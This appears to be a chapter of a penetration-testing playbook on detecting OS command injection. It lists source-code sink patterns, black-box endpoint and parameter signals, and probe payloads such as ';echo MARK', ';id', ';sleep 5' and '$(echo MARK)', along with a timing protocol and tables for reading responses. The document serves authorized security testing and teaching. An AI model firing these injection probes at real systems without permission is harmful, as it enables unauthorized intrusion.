# Detection — prove the sink and the shell boundary

## The one question that decides everything

**Does the input reach a shell (or evaluator), or an argv element?**

Everything else — separators, filters, exfil — hangs on this. Detection
has two stages:

1. **Sink discovery** — is there a command executed at all?
2. **Boundary test** — is the input inside a shell string or an argv element?

## Stage 1 — sink discovery signals

Source grep targets (per language → `whitebox-hunt.md`):

```
system(   shell_exec(   exec(   passthru(   popen(   proc_open(
`...`     subprocess.*shell=True   os.system   os.popen
child_process.exec   execSync   Runtime.exec   ProcessBuilder
eval(     os.spawnl    commands.getoutput   IO.popen   Open3
```

Black-box signals that a command runs at all:

- endpoint names: `/ping`, `/traceroute`, `/nslookup`, `/dig`, `/convert`,
  `/pdf`, `/health-check`, `/network-test`, `/tools/`
- params: `host=`, `ip=`, `domain=`, `target=`, `url=`, `file=`, `path=`,
  `cmd=`, `command=`, `exec=`, `query=`
- responses containing command-shaped output: `PING`, `bytes from`,
  `traceroute to`, `Name:`, `uid=`
- errors naming tools: `ping:`, `nslookup`, `convert:`, `sh:`,
  `Syntax error`

## Stage 2 — the boundary test

The decisive probe is **one metacharacter that changes meaning only inside
a shell**:

```
value;echo MARKER      → marker in output?    → shell string boundary
value|echo MARKER      → marker in output?    → pipe works → shell
value;id               → uid= in output?      → confirmed exec
```

If a `;` or `|` produces a *different error or new output* vs the same
value URL-encoded, the value is inside a shell-parsed string.

### The falsifier (closes the class)

The value is passed as a single argv element — `execFile('ping', [value])`,
`subprocess.run(['ping', value])`, `ProcessBuilder('ping', value)` — no
shell, no injection. Metacharacters become literal characters in argv[1].
Symptom: `;id` produces `ping: x;id: Name or service not known` — the
separator is echoed inside the error as data, not interpreted.

## The channel matrix — three channels to test per separator

`cmdi_probe.py` runs this matrix automatically:

```bash
python3 tools/web/cmdi_probe.py --url "$BASE/ping" --param host \
  --value "127.0.0.1" --method POST
```

| Channel | Payload shape | Confirms when |
|---|---|---|
| output | `127.0.0.1;echo MARK` | `MARK` in response body |
| error | `127.0.0.1;` | shell syntax error appears |
| time | `127.0.0.1;sleep 5` | repeatable ≥5s delta vs baseline |

## Timing channel — the honest version

One slow request is inconclusive (network jitter, cold cache). The
baseline-vs-variant protocol:

```
1. baseline: send the benign value 3x → median T
2. variant:  value + `;sleep 5` → send 3x → median T'
3. control:  value + `;sleep 0` → stays at T? (rules out payload-size cost)
4. confirm only when T' - T ≈ 5s repeatedly AND control ≈ T
```

`sleep` alternatives when `sleep` is filtered: `ping -c 5 127.0.0.1`,
`timeout 5 cat`, `curl http://10.255.255.1/` (unreachable → timeout,
weaker), `bash -c 'read -t 5'`, `awk 'BEGIN{systime();while(systime()-X<5)}'`.

## Order of probe classes — cheapest first

1. `;echo MARK` — output channel, instant
2. `|echo MARK` / `||echo MARK` — pipe variant (some filters allow `|` but
   not `;`)
3. `$(echo MARK)` — substitution inside the original arg position
4. `;sleep 3` — timing channel
5. error oracle — malformed input that only errors inside a shell

## Which response differences matter

| Observation | Meaning |
|---|---|
| marker string in response | shell interpreted the separator |
| `uid=...gid=...` in response | confirmed exec — evidence-grade |
| `sh: 1: X: not found` | shell exists, command name filtered/wrong |
| `Syntax error: ...` | input reached a shell parser (quoting state) |
| same output as baseline | separator treated as data → argv or escaped |
| generic 500 | ambiguous — never a confirm |
| timeout | weak signal — needs repeatability |

## The decode layer — where injection lands after transforms

Input often reaches the shell after transforms: urldecode → base64
decode → json parse → string concat. Test at the *decoded* layer — if
the app base64-decodes then shells it, your payload must decode *to*
the metacharacters, so inject the raw metachars into the pre-encoded
value (i.e., encode `127.0.0.1;id`).

## First-run protocol (bounded)

```
probe 1: benign value            → baseline (status, length, time)
probe 2: value;echo MARK         → output channel
probe 3: value;id                → evidence-grade output
probe 4: value;sleep 4           → timing channel
probe 5: "value" or 'value'      → quoting state discovery
```

Five probes, one class budget — matches the controller's 5-probe bound.

## What each result means for next step

| Result | Next module |
|---|---|
| marker in output | `data-exfil-channels.md` → `payload-dictionary.md` |
| timing only | `blind-cmdi.md` → `oob-exfil.md` |
| `Syntax error: unterminated quoted` | `quoting.md` |
| `not found` errors only | sink exists, escape needed → `quoting.md` |
| separator echoed as data | argv boundary → `argument-injection.md` |
| `eval`/`Function`/`calc` sink | `eval-injection.md` |

## Falsifiers

- every separator echoed back verbatim as data with no shell error
- source shows argv-array execution with no shell flag
- no command-invoking sink exists (endpoint is pure logic)

## Output to record

- sink name + boundary type (shell-string vs argv vs eval)
- which channel produced signal + verbatim excerpt or timing numbers
